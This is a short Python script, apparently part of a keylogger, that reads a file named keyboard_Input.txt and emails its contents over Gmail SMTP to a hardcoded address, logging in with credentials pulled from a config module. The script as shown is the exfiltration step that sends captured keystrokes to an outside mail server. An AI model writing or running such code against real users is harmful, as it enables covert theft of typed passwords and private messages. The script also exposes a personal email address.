#!/usr/bin/env python3

import smtplib 
from email.message import EmailMessage 
import config 

with open('keyboard_Input.txt') as msgcontent: 
 msg = EmailMessage() 
 msg.set_content(msgcontent.read()) 

msg['Subject'] = f'The contents of {"keyboard_Input.txt"}' 
msg['From'] = 'sccomtois@gmail.com' 
msg['To'] = 'sccomtois@gmail.com'

server = smtplib.SMTP('smtp.gmail.com:587') 
server.ehlo() 
server.starttls() 
server.login(config.EMAIL_ADDRESS, config.PASSWORD) 
server.send_message(msg) 
server.quit()
